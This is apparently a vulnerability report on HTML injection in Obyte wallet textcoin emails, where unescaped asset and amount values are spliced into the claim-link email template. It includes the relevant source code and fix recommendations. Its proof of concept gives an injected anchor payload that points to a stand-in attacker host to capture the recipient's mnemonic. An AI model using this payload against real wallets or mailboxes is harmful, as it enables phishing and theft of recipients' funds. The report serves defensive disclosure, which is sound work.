### Title
HTML Email Injection in Textcoin Notification Emails via Unsanitized `asset`/`amount` Fields - ([File: wallet.js])

### Summary
When a wallet sends a "textcoin" (a payment to an email address instead of an Obyte address), `sendMultiPayment` builds an HTML notification email for the recipient by interpolating caller-supplied values directly into a static HTML template with no encoding, mirroring the root cause of CVE-2023-22288 (unescaped user-controlled data embedded in an HTML email).

### Finding Description
`sendMultiPayment` collects textcoin payments whose destination is an email address and, once the unit is broadcast, calls `sendTextcoinEmail(email, opts.email_subject, objPayment.amount, objPayment.asset, objPayment.mnemonic)` for each recipient [1](#0-0) .

`sendTextcoinEmail` passes `amount`, `asset`, `mnemonic`, and a derived `usd_amount_str` to `replaceInTextcoinTemplate`, which loads `email_template.html` and performs raw regex `String.replace` substitution of `{{key}}` placeholders with the caller-supplied values — no HTML-escaping is applied to any of them: [2](#0-1) .

The template itself embeds these fields directly inside HTML markup and inside an `<a href="...">` link that is the actual claim link the recipient is expected to click: [3](#0-2) .

The resulting `html`/`text` bodies are then handed unmodified to `mail.sendmail()` as `htmlBody`, which nodemailer/sendmail deliver as-is (`html: params.htmlBody`), with only the `to`/`from`/`subject` header fields stripped of CR/LF — the HTML body content itself is never sanitized: [4](#0-3) [5](#0-4) .

The `asset` value that flows into the template comes from `objPayment.asset`, set in `generateNewMnemonicIfNoAddress` from the payment's asset identifier supplied by the caller of `sendMultiPayment` (`opts.asset` / `opts.outputs_by_asset` keys) without validating it as a well-formed 44-character base64 asset unit hash before it is used in the email body: [6](#0-5) .

Because the asset identifier string is trusted to already be "safe" (a hash), but is never actually validated to match that format before being spliced into `email_template.html`, any caller able to reach `sendMultiPayment` with an attacker-chosen "asset" string (e.g. a custom/unregistered asset value, or any component that forwards a caller-controlled string into this field) can inject arbitrary HTML/markup into the generated email — including replacing or appending additional `<a href>` elements near or over the legitimate textcoin claim link.

### Impact Explanation
An attacker who can influence the `asset` (or similarly interpolated) value used when composing a textcoin payment can inject arbitrary HTML into the notification email sent to the (unrelated, third-party) recipient's mailbox. Because the injected markup lands in the very email whose sole purpose is to deliver a funds-claim link (`https://obyte.org/#textcoin?{{mnemonic}}`), an attacker can overlay or replace this link with a phishing URL, tricking the legitimate recipient into surrendering the mnemonic/claim path to the attacker and letting the attacker claim the textcoin funds before the intended recipient — a concrete unauthorized-spending / fund-theft outcome, consistent with the "private-payment counterparty" reachability allowed by scope.

### Likelihood Explanation
Exploitation only requires the ability to initiate a textcoin payment with a controlled asset value and target email address, which is a standard, low-privilege wallet operation (no special node privileges, no p2p/hub compromise required). The lack of any escaping or format validation on the interpolated fields makes exploitation straightforward once such a path is reachable.

### Recommendation
- HTML-escape (or use a proper templating engine with auto-escaping) all values interpolated into `email_template.html` in `replaceInTextcoinTemplate` (`amount`, `asset`, `usd_amount_str`, `mnemonic`).
- Strictly validate that `asset` is either `null`/base asset or a well-formed 44-character base64 unit hash before it is used anywhere outside of internal bookkeeping, rejecting/ignoring malformed values.
- Consider rendering the claim link from a fixed, non-interpolated template segment (only the mnemonic, itself already constrained to valid mnemonic characters, should vary) rather than allowing arbitrary substitution near the `<a href>` element.

### Proof of Concept
1. Trigger `sendMultiPayment` (directly or via any wrapper/API that exposes `asset` or `outputs_by_asset` keys to caller control) with a textcoin output addressed to `victim@example.com` and an `asset` value crafted as HTML, e.g.:
   `"><a href="https://evil.example/steal?m={{mnemonic}}">Click to claim</a><span x="`
2. `generateNewMnemonicIfNoAddress` stores this string as `objPayment.asset` [7](#0-6) .
3. After broadcast, `sendTextcoinEmail` calls `replaceInTextcoinTemplate` which substitutes `{{asset}}` verbatim into the HTML template without escaping [8](#0-7) .
4. The resulting HTML email, containing the attacker's injected anchor tag, is emailed via `mail.sendmail` to the victim, who may click the attacker's link instead of (or in addition to) the legitimate claim link, exposing the mnemonic and allowing the attacker to claim the funds first.

function sendTextcoinEmail(email, subject, amount, asset, mnemonic){
	var mail = require('./mail.js');
	var usd_amount_str = '';
	if (!asset){
		amount -= constants.TEXTCOIN_CLAIM_FEE;
		if (network.exchangeRates['GBYTE_USD']) {
			usd_amount_str = " (≈" + ((amount/1e9)*network.exchangeRates['GBYTE_USD']).toLocaleString([], {maximumFractionDigits: 2}) + " USD)";
		}
		amount = (amount/1e9).toLocaleString([], {maximumFractionDigits: 9});
		asset = 'GB';
	}
	replaceInTextcoinTemplate({amount: amount, asset: asset, mnemonic: mnemonic, usd_amount_str: usd_amount_str}, function(html, text){
		mail.sendmail({
			to: email,
			from: conf.from_email || "noreply@obyte.org",
			subject: subject || "Obyte user beamed you money",
			body: text,
			htmlBody: html
		});
	});
}

function replaceInTextcoinTemplate(params, handleText){
	var fs = require('fs');
	fs.readFile(__dirname + '/email_template.html', 'utf8', function(err, template) {
		if (err)
			throw Error("failed to read template: "+err);
		_.forOwn(params, function(value, key){
			var re = new RegExp('\\{\\{' + key + '\\}\\}',"g");
			template = template.replace(re, value);
		});
		template = template.replace(/\{\{\w*\}\}/g, '');

		var text = "Here is your link to receive " + params.amount + " " + params.asset + params.usd_amount_str + ": https://obyte.org/#textcoin?" + params.mnemonic;
		handleText(template, text);
	});
}
